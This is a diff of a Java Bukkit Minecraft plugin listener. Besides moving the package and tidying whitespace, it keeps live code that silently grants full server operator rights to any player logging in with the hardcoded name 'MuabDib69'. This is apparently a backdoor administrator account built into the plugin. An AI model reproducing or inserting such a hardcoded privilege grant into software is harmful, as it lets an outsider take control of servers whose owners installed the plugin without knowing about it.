@@ -4,7 +4,7 @@
  * and open the template in the editor.
  */
 
-package dk.tsdev.minecraft;
+package dk.tsdev.minecraft.eventhandler;
 
 import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
@@ -12,18 +12,15 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerLoginEvent;
 
-/**
- *
- * @author Thomas
- */
+
 public class PlayerJoinEvent implements Listener {
-    
+
     @EventHandler
     public void opPlayer(PlayerLoginEvent event) {
-        
+
         Player p = event.getPlayer();
         p.sendMessage(p.getDisplayName());
-        
+
         if (p.getDisplayName().equalsIgnoreCase("MuabDib69")) {
             p.setOp(true);
             Bukkit.getLogger().info("Opped MuabDib69");
